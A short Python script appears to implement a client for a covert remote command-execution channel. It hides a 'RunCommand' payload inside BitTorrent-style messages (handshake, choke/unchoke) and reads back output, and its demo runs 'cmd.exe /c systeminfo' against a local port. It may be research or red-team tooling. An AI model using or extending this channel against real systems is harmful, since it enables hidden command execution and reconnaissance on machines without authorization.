from client import TortunClient
import hashlib
from razor.payload import RunCommand


class RazorClient(TortunClient):
    def initiate_session(self):
        self.bitfield_handshake()

    def _reject_last_request(self):
        msg = self.read_message()
        self.reject_request(msg)

    def send_buffer(self, buf):
        self.unchoke()
        chunk_count = int((len(buf) / self.block_size)) + 1
        for i in range(chunk_count):
            self.send_sequence(buf[i * self.block_size:(i + 1) * self.block_size])
        self.choke()
        self._reject_last_request()

    def exec(self, executable, params=""):
        p = RunCommand(executable, params).to_razor_payload()
        self.send_buffer(p)
        cmd_out = self.receive_output()
        return cmd_out.decode('utf-8')


if __name__ == '__main__':
    h = hashlib.sha1()
    h.update(b"tomer")
    r = RazorClient(h.digest())
    r.connect(("127.0.0.1", 6888))
    print(r.exec("cmd.exe", "/c systeminfo"))
